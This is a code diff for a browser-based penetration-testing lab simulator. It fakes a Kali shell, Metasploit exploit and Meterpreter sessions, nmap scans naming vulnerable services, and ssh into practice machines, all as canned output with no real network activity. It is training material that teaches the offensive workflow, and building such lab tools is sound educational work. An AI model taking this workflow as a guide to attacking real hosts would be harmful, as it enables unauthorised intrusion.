+    if(base==='sysinfo'){log('Computer: linux-vuln\nOS: Linux 4.15.0-20-generic','out');return}
+    if(base==='shell'){log('[*] Opening shell...\nwww-data@vulnversity:/var/www$ ','out');return}
+    if(base==='background'){session.msfSession=false;log('[*] Backgrounded session 1','warn');setPlaybook('msf');updatePrompt();return}
+    if(base==='upload'){
+      const lfile=args[0], rfile=args[1];
+      if(!lfile ||!rfile){log('[-] Usage: upload <lfile> <rfile>','err');return}
+      session.meterFs.push(rfile);log(`[*] Uploading: ${lfile} -> ${rfile}\n[+] Uploaded 1 file: ${rfile} (1024 bytes)`,'out');return
     }
-    if (base === 'set' && args[0]?.toUpperCase() === 'RHOSTS') { CHOSEN_RHOST = args[1]; return `RHOSTS => ${CHOSEN_RHOST}`; }
-    if (base === 'exploit' || base === 'run') {
-      if (!CHOSEN_EXPLOIT || !CHOSEN_RHOST) return '[-] Error: Target variables parameter definitions missing.';
-      const data = PLAYBOOKS_REGISTRY[CHOSEN_EXPLOIT];
-      if (CHOSEN_RHOST === data.target_ip) { updateTopologyUI(CHOSEN_RHOST); return data.success_payload_response; }
-      return `[-] Exploit failed: Target parameters mismatch. Connection dropped.`;
+    if(base==='download'){
+      const rfile=args[0], lfile=args[1];
+      if(!rfile ||!lfile){log('[-] Usage: download <rfile> <lfile>','err');return}
+      if(!session.meterFs.includes(rfile)){log(`[-] File not found: ${rfile}`,'err');return}
+      log(`[*] Downloading: ${rfile} -> ${lfile}\n[+] Downloaded 1 file: ${lfile} (512 bytes)`,'out');return
     }
-    return `msf6: Command '${base}' unmapped inside framework simulation loops.`;
-  }
-
-  /* ========== EXPANDED GENERAL PURPOSE LINUX MATRIX ========== */
-  if (base === 'ls') {
-    let outputFiles = [];
-    for (let key in ARCHIVE_FILES) {
-      if (key.startsWith(CURRENT_DIR) && key.substring(CURRENT_DIR.length + 1).indexOf('/') === -1) {
-        outputFiles.push(key.split('/').pop());
-      }
+    if(base==='execute'){
+      const fIdx=args.indexOf('-f');
+      const file=fIdx!==-1?args[fIdx+1]:null;
+      if(!file){log('[-] Usage: execute -f <file>','err');return}
+      log(`[*] Executing: ${file}\n[+] Process ${Math.floor(Math.random()*5000)} created.`,'warn');return
     }
-    ARCHIVE_FOLDERS.forEach(f => {
-      if (f.startsWith(CURRENT_DIR) && f !== CURRENT_DIR) {
-        let rel = f.substring(CURRENT_DIR.length + 1);
-        if (rel && rel.indexOf('/') === -1) outputFiles.push(`<span style="color:#38bdf8; font-weight:bold;">${rel}/</span>`);
-      }
-    });
-    return outputFiles.length ? outputFiles.join('    ') : '[Directory is empty]';
+    log(`meterpreter > ${cmd}\n[+] Command executed`,'out');return
   }
 
-  if (base === 'pwd') return CURRENT_DIR;
-  if (base === 'whoami') return 'root';
-  if (base === 'clear') { termOut.innerHTML = ''; return ''; }
-  
-  if (base === 'cd') {
-    if (!args[0] || args[0] === '~') { CURRENT_DIR = "/root"; refreshPrompt(); return ''; }
-    let pathCheck = args[0].startsWith('/') ? args[0] : (CURRENT_DIR === '/' ? '/' + args[0] : CURRENT_DIR + '/' + args[0]);
-    pathCheck = pathCheck.replace(/\/$/, ""); 
-    if (ARCHIVE_FOLDERS.includes(pathCheck)) { CURRENT_DIR = pathCheck; refreshPrompt(); return ''; }
-    return `bash: cd: ${args[0]}: No such directory asset stored.`;
+  if(session.msf){
+    if(base==='exit'){session.msf=false;session.msfModule=null;session.msfRhosts=null;log('[*] Exiting Metasploit','warn');setPlaybook('kali');updatePrompt();return}
+    if(base==='search'){
+      const term=args.join(' ');
+      const results=msfModules.filter(m=>m.toLowerCase().includes(term.toLowerCase()));
+      log(results.length?results.join('\n'):'No matches','out');return
+    }
+    if(base==='use' && args[0]?.startsWith('exploit/')){session.msfModule=args[0];log(`[+] Using ${session.msfModule}`,'out');return}
+    if(base==='set' && args[0]==='RHOSTS'){session.msfRhosts=args[1];log(`RHOSTS => ${session.msfRhosts}`,'out');return}
+    if(base==='set' && args[0]==='RPORT'){log(`RPORT => ${args[1]}`,'out');return}
+    if(base==='run' || base==='exploit'){
+      if(!session.msfModule){log('[-] No module selected. Use use exploit/...','err');return}
+      if(!session.msfRhosts){log('[-] No RHOSTS set. Use set RHOSTS <ip>','err');return}
+      log(`[*] Started reverse TCP handler on 10.10.14.2:4444\n[*] Sending stage...\n[+] Shell session ${session.msfSessionId} opened (10.10.14.2:4444 -> ${session.msfRhosts}:80)`,'warn');return
+    }
+    if(base==='sessions'){
+      if(args[0]==='-l'){log(`Active sessions\n==============\n\n Id Name Type Information Connection\n -- ---- ---- ----------- ----------\n 1 meterpreter linux www-data@10.10.10.11 10.10.14.2:4444 -> ${session.msfRhosts||'10.10.10.11'}:80`,'out');return}
+      if(args[0]==='-i'){session.msfSession=true;setPlaybook('msfpost');log('[*] Starting interaction with 1...\nmeterpreter > ','warn');updatePrompt();return}
+    }
+    if(base==='back'){session.msfModule=null;log('[-] Back from module','out');return}
+    log(`[-] Unknown command: ${cmd}`,'err');return
   }
 
-  // File Management Extensions
-  if (base === 'mkdir') {
-    if (!args[0]) return 'mkdir: missing operand parameter folder definition';
-    let newFolder = args[0].startsWith('/') ? args[0] : (CURRENT_DIR === '/' ? '/' + args[0] : CURRENT_DIR + '/' + args[0]);
-    if (ARCHIVE_FOLDERS.includes(newFolder)) return `mkdir: cannot create directory '${args[0]}': File exists`;
-    ARCHIVE_FOLDERS.push(newFolder); return '';
-  }
-  if (base === 'touch') {
-    if (!args[0]) return 'touch: missing filename operand definition parameters';
-    let filePath = args[0].startsWith('/') ? args[0] : (CURRENT_DIR === '/' ? '/' + args[0] : CURRENT_DIR + '/' + args[0]);
-    if (!ARCHIVE_FILES.hasOwnProperty(filePath)) ARCHIVE_FILES[filePath] = "";
-    return '';
-  }
-  if (base === 'rm') {
-    if (!args[0]) return 'rm: missing filename parameter pointer operand';
-    let targetPath = args[0].startsWith('/') ? args[0] : (CURRENT_DIR === '/' ? '/' + args[0] : CURRENT_DIR + '/' + args[0]);
-    if (ARCHIVE_FILES.hasOwnProperty(targetPath)) { delete ARCHIVE_FILES[targetPath]; return ''; }
-    return `rm: cannot remove '${args[0]}': No such file target map found.`;
-  }
+  if(base==='clear'){term.innerHTML='';return}
+  if(base==='help'){log(kaliCmds.join('\n'),'out');return}
+  if(base==='ipconfig'){log(`eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500\n inet 10.10.14.2 netmask 255.255.255.0 broadcast 10.10.14.255`,'out');return}
+  if(base==='msfconsole'){
+    session.msf=true;
+    log(`
 
-  // Advanced Text Stream Engine Components
-  if (base === 'cat') {
-    if (!args[0]) return 'Usage: cat [filename]';
-    let targetPath = args[0].startsWith('/') ? args[0] : (CURRENT_DIR === '/' ? '/' + args[0] : CURRENT_DIR + '/' + args[0]);
-    if (ARCHIVE_FILES.hasOwnProperty(targetPath)) return escapeHtml(ARCHIVE_FILES[targetPath]);
-    return `cat: ${args[0]}: No such file inside structural registry.`;
+        =[ metasploit v6.4.0-dev ]\n+ --=[ 2450 exploits - 1254 auxiliary - 408 post ]\n+ --=[ 1191 payloads - 47 encoders - 13 nops ]\n+ --=[ 9 evasion ]\n\nmsf6 > `,'warn');
+    setPlaybook('msf');
+    updatePrompt();return
   }
-  if (base === 'grep') {
-    if (!args[0] || !args[1]) return 'Usage: grep [search_string] [filename]';
-    let targetPath = args[1].startsWith('/') ? args[1] : (CURRENT_DIR === '/' ? '/' + args[1] : CURRENT_DIR + '/' + args[1]);
-    if (!ARCHIVE_FILES.hasOwnProperty(targetPath)) return `grep: ${args[1]}: No such file targets.`;
-    let lines = ARCHIVE_FILES[targetPath].split('\n');
-    let matched = lines.filter(l => l.includes(args[0]));
-    return matched.length ? escapeHtml(matched.join('\n')) : '';
+  if(base==='nmap'){const ip=args[0];const r=rooms.find(x=>x.ip===ip);log(r?r.nmap:`Nmap scan report for ${ip}\nAll 1000 scanned ports are closed`,'out');return}
+  if(base==='ls'){log(session.vfs.join(' '),'out');return}
+  if(base==='cd'){
+    if(!args[0] || args[0]==='~'){session.cwd='~';updatePrompt();return}
+    if(args[0]==='..'){session.cwd='~';updatePrompt();return}
+    if(session.vfs.includes(args[0])){session.cwd=`~/${args[0]}`;updatePrompt();return}
+    log(`bash: cd: ${args[0]}: No such file or directory`,'err');return
   }
-  if (base === 'head' || base === 'tail') {
-    if (!args[0]) return 'Usage: head/tail [-n lines] [filename]';
-    let lineCount = 5; let fileArg = args[0];
-    if (args[0] === '-n' && args[1]) { lineCount = parseInt(args[1]); fileArg = args[2]; }
-    if (!fileArg) return 'Error: Filename argument expected.';
-    let targetPath = fileArg.startsWith('/') ? fileArg : (CURRENT_DIR === '/' ? '/' + fileArg : CURRENT_DIR + '/' + fileArg);
-    if (!ARCHIVE_FILES.hasOwnProperty(targetPath)) return `${base}: ${fileArg}: File not found.`;
-    let fileLines = ARCHIVE_FILES[targetPath].split('\n');
-    let outLines = (base === 'head') ? fileLines.slice(0, lineCount) : fileLines.slice(-lineCount);
-    return escapeHtml(outLines.join('\n'));
+  if(base==='mkdir'){
+    if(!args[0]){log('mkdir: missing operand','err');return}
+    if(session.vfs.includes(args[0])){log(`mkdir: cannot create directory '${args[0]}': File exists`,'err');return}
+    session.vfs.push(args[0]);log('','out');return
   }
-  if (base === 'sed') {
-    if (!args[0] || !args[1]) return 'Usage: sed s/old/new/ [filename]';
-    let expr = args[0].split('/'); if(expr[0] !== 's' || expr.length < 3) return 'Invalid sed syntax definition mapping pattern.';
-    let targetPath = args[1].startsWith('/') ? args[1] : (CURRENT_DIR === '/' ? '/' + args[1] : CURRENT_DIR + '/' + args[1]);
-    if (!ARCHIVE_FILES.hasOwnProperty(targetPath)) return `sed: ${args[1]}: File not found.`;
-    return escapeHtml(ARCHIVE_FILES[targetPath].replaceAll(expr[1], expr[2]));
+  if(base==='rm'){
+    if(!args[0]){log('rm: missing operand','err');return}
+    if(!session.vfs.includes(args[0])){log(`rm: cannot remove '${args[0]}': No such file or directory`,'err');return}
+    session.vfs=session.vfs.filter(f=>f!==args[0]);log('','out');return
   }
-  if (base === 'awk') {
-    if (!args[0] || !args[1]) return 'Usage: awk {print} [filename]';
-    let targetPath = args[1].startsWith('/') ? args[1] : (CURRENT_DIR === '/' ? '/' + args[1] : CURRENT_DIR + '/' + args[1]);
-    if (!ARCHIVE_FILES.hasOwnProperty(targetPath)) return `awk: ${args[1]}: File not found.`;
-    return escapeHtml(ARCHIVE_FILES[targetPath]);
+  if(base==='cat' && args[0]==='rooms.txt'){log(rooms.map(r=>`${r.name} ${r.ip} ${r.user}@${r.ip}`).join('\n'),'out');return}
+  if(base==='ping'){log(`64 bytes from ${args[0]}: ttl=64 time=12.1 ms`,'out');return}
+  if(base==='enum'){log(`${rooms.length} machines loaded. Use ssh user@ip`,'out');return}
+  if(base==='whoami'){log(`kali`,'out');return}
+  if(base==='ssh'){
+    const match = cmd.match(/ssh ([\w-]+)@([\d.]+)/);
+    if(!match){log('Usage: ssh user@ip','err');return}
+    const [,user,ip] = match;
+    const room = rooms.find(r=>r.ip===ip && r.user===user);
+    if(room){setSession('room',room);return}
+    log(`ssh: Permission denied, please try again.`,'err');return
   }
-
-  // Interactive Screen Editor Overlay
-  if (base === 'vim') {
-    if (!args[0]) return 'vim: Provide a filename context target map path variable.';
-    let path = args[0].startsWith('/') ? args[0] : (CURRENT_DIR === '/' ? '/' + args[0] : CURRENT_DIR + '/' + args[0]);
-    VIM_TARGET_FILE = path; VIM_MODE = true; vimFilename.textContent = args[0];
-    vimEditor.value = ARCHIVE_FILES[path] || ""; vimContainer.style.display = "flex"; vimEditor.focus();
-    return '';
-  }
-
-  // Package & Processing Management Simulations
-  if (base === 'apt' || base === 'apt-get') {
-    if (args[0] === 'update') return 'Hit:1 http://http.kali.org/kali kali-rolling InRelease\nReading package lists... Done\nBuilding dependency tree... Done\nAll operational modules up to date.';
-    if (args[0] === 'install') return `Reading package lists... Done\nBuilding dependency tree... Done\nSelected application package installation sequence verified for [${args[1] || 'module'}].`;
-    return 'Usage: apt [update | install package_name]';
-  }
-  if (base === 'systemctl') {
-    if (!args[0] || !args[1]) return 'Usage: systemctl [start | stop | restart] [service]';
-    return `[✓] Synchronizing state interface. Service unit validation structure executed for: ${args[1]}.service`;
-  }
-  if (base === 'top' || base === 'htop') {
-    return 'Tasks: 142 total,   1 running, 141 sleeping,   0 stopped\n%Cpu(s):  1.2 us,  0.4 sy,  0.0 ni, 98.4 id\nMiB Mem :   4096.0 total,   2104.2 free,    892.4 used\n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n 1042 root      20   0  712424  42104  24122 S   0.7   1.0   0:14.22 apache2\n 1855 root      20   0   12440   3102   1842 R   0.3   0.1   0:01.05 htop';
-  }
-  if (base === 'uname') { return 'Linux kali 6.1.0-kali7-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.1.16-1kali1 (2026-03-14) x86_64 GNU/Linux'; }
-
-  // Networking Suite Configurations
-  if (base === 'ifconfig' || base === 'ipconfig' || (base === 'ip' && args[0] === 'a')) {
-    return `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 10.0.5.5  netmask 255.255.255.0  broadcast 10.0.5.255\n        ether 08:00:27:cc:78:a1  (Local Core Console Adapter Address)`;
-  }
-  if (base === 'ip' && args[0] === 'route') { return 'default via 10.0.5.1 dev eth0 proto dhcp src 10.0.5.5\n10.0.5.0/24 dev eth0 proto kernel scope link src 10.0.5.5'; }
-  if (base === 'ss' || base === 'netstat') { return 'Netid  State   Recv-Q  Send-Q     Local Address:Port     Peer Address:Port\ntcp    LISTEN  0       128              127.0.0.1:5432         0.0.0.0:*\ntcp    LISTEN  0       80                 0.0.0.0:80           0.0.0.0:*'; }
-  
-  if (base === 'curl' || base === 'wget') {
-    if (!args[0]) return `${base}: address endpoint coordinate mapping target required.`;
-    let url = args.find(a => a.includes('10.0.5.15') || a.includes('10.0.5.20'));
-    if (!url) return `${base}: Network routing fault connection dropped timeout.`;
-    if (url.includes('10.0.5.15')) return `HTTP/1.1 200 OK\nServer: Apache-Coyote/1.1\nContent-Type: text/html\n\n&lt;html&gt;&lt;body&gt;&lt;h1&gt;Apache Tomcat/Struts Showcase Landing Context&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;`;
-    return 'HTTP/1.1 200 OK\nMicrosoft-IIS/10.0\nContent-Length: 1422';
-  }
-  if (base === 'ping') {
-    if (!args[1]) return 'Usage: ping -c 3 [Target IP]';
-    const target = args.find(a => a === '10.0.5.15' || a === '10.0.5.20');
-    if (!target) return 'ping: unknown network target interface endpoint dropping.';
-    return `PING ${target} 56(84) bytes of data.\n64 bytes from ${target}: icmp_seq=1 ttl=64 time=0.40ms\n\n--- ${target} ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss`;
-  }
-
-  // Permissions Settings Ring Control
-  if (base === 'chmod') {
-    if (!args[0] || !args[1]) return 'Usage: chmod [+x | 755] [filename]';
-    return `[✓] Permission mask update attributes compiled for target file object metadata structure: ${args[1]}`;
-  }
-  if (base === 'chown') {
-    if (!args[0] || !args[1]) return 'Usage: chown [owner:group] [filename]';
-    return `[✓] Kernel inode reference identity ownership updated successfully for reference node: ${args[1]}`;
-  }
-  if (base === 'sudo') {
-    if (args[0] === '-l') return 'Matching Defaults entries for root on kali:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\n\nUser root may run the following commands on kali:\n    (ALL : ALL) ALL';
-    return `[sudo] execution process structural request passed cleanly inside parent root ring.`;
-  }
-
-  // Legacy Security Assessment Tools
-  if (base === 'msfconsole') {
-    MSF_MODE = true; refreshPrompt();
-    return `<span class="meta-term">=[ metasploit v6.3.5-dev                           ]\n+ -- --=[ 2341 exploits - 1210 payloads - 411 encoders ]</span>\nmsf6 framework loaded. Reference playbooks on the right side.`;
-  }
-  if (base === 'nmap') {
-    const ip = args.find(a => a === '10.0.5.15' || a === '10.0.5.20');
-    if (!ip) return 'Usage: nmap -sV [Target IP]';
-    if (ip === '10.0.5.15') return `Nmap scan for 10.0.5.15\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 2.3.4\n22/tcp   open  ssh     OpenSSH 8.2p1\n8080/tcp open  http    Apache Tomcat (Struts2 App)`;
-    if (ip === '10.0.5.20') return `Nmap scan for 10.0.5.20\nPORT    STATE SERVICE VERSION\n445/tcp open  smb     Windows Server SMB Core (MS17-010 Vulnerable)`;
-  }
-
-  if (base === 'help') { return 'Available Utilities: ls, cd, pwd, whoami, mkdir, touch, rm, cat, grep, head, tail, sed, awk, vim, apt, systemctl, top, uname, ip, ss, curl, wget, ping, chmod, chown, sudo, clear, nmap, msfconsole'; }
-
-  return `bash: ${input}: command execution unmapped or unrecognized`;
+  log(`bash: ${base}: command not found`,'err');
 }
 
-/* ========== EVENT REGISTRATION ENGINE BINDINGS ========== */
-termIn.addEventListener('keydown', e=>{
-  if(e.key==='Enter' && !VIM_MODE){
-    const cmd = termIn.value.trim(); if(!cmd) return;
-    let promptText = termPrompt.textContent || '';
-    if(MSF_MODE) {
-      let slug = CHOSEN_EXPLOIT ? ` (${CHOSEN_EXPLOIT.split('/').pop()})` : '';
-      promptText = `msf6 exploit${slug} >`;
-    }
-    termPrint(`<span class="prompt">${promptText}</span> <span class="cmd">${escapeHtml(cmd)}</span>`);
-    const out = runCmd(cmd);
-    if(out) termPrint(out, out.includes('failed') || out.includes('Error') || out.includes('unrecognized') ? 'err' : 'out');
-    termIn.value='';
-  }
-});
+function runRoom(cmd){
+  const base = cmd.trim().split(' ')[0];
+  if(base==='exit'){setSession('kali');return}
+  if(base==='nmap'){log('Error: nmap must run from Kali','err');return}
+  log(sim(cmd, session.room),'out');
+}
 
-vimEditor.addEventListener('keydown', e => {
-  if (VIM_MODE && e.key === 'Enter') {
-    let lines = vimEditor.value.split('\n'); let lastLine = lines[lines.length - 1].trim();
-    if (lastLine === ':wq') {
-      e.preventDefault(); lines.pop(); ARCHIVE_FILES[VIM_TARGET_FILE] = lines.join('\n');
-      VIM_MODE = false; vimContainer.style.display = "none";
-      termPrint(`[Vim] Written and saved file modifications to: ${VIM_TARGET_FILE}`, 'prompt'); termIn.focus();
-    } else if (lastLine === ':q!') {
-      e.preventDefault(); VIM_MODE = false; vimContainer.style.display = "none";
-      termPrint(`[Vim] Closed file without writing changes.`, 'err'); termIn.focus();
-    }
-  }
-});
+function run(cmd){pcmd(cmd); if(session.mode==='kali') runKali(cmd); else runRoom(cmd)}
 
-function escapeHtml(text) { return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }
-refreshPrompt();
-termPrint('Kali Enterprise Rolling Linux Lab environment initialized successfully. All platform system utilities, streaming routers, and text processors mapped online.', 'prompt');
+input.addEventListener('keydown',e=>{if(e.key==='Enter'&&input.value){run(input.value);input.value=''}});
+function saveNotes(){if(session.room){localStorage.setItem(`notes_${session.room.id}`,document.getElementById('notes').value);}else{localStorage.setItem(`notes_kali`,document.getElementById('notes').value);}log('[+] Notes Saved','warn')}
+
+renderRooms();
+setSession('kali');
 </script>
 </body>
 </html>
